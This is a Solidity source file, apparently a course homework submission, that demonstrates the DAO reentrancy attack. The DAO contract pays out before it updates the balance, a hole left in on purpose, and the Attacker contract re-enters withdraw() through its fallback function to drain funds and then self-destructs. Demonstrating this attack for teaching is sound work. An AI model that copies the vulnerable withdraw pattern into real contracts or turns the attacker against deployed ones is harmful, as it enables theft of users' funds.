/*作业请提交在这个目录下*/
pragma solidity ^0.4.0;

/* 
 * create DAO - deposit() + value - getBalance -100
 * new Attacker(dao.contract.address) + value - dao.getBalance = dao + attacker
 * attacker.attack - dao.getBalance, attacker.getBalance 
 */

contract DAO {
    mapping(address => uint) public balances;
    function getBalance() returns(uint256) {
        return this.balance;
    }

    function deposit() payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) {
        if (balances[msg.sender] < amount) throw;
        msg.sender.call.value(amount)();
        balances[msg.sender] -= amount;
    }
}

contract MiniDAOabstract {
    mapping(address => uint) public banances;
    function deposit() payable { }
    function withdraw(uint amount) { }
}

contract Attacker {

    uint public stack = 0;
    uint constant stacklimit = 10;
    uint public amount;
    MiniDAOabstract dao;
    
    function getBalance() returns(uint) {
        return this.balance;
    }

    function Attacker(address daoAddress) payable {
        dao = MiniDAOabstract(daoAddress);
        amount = msg.value;
        dao.deposit.value(msg.value)();
    }
    
    function attack() {
        dao.withdraw(amount);
    }
    
    function () payable {
        if (stack++ < 10) {
            dao.withdraw(amount);
        }
    }
    
    function resolve() {
        selfdestruct(msg.sender);
    }
}
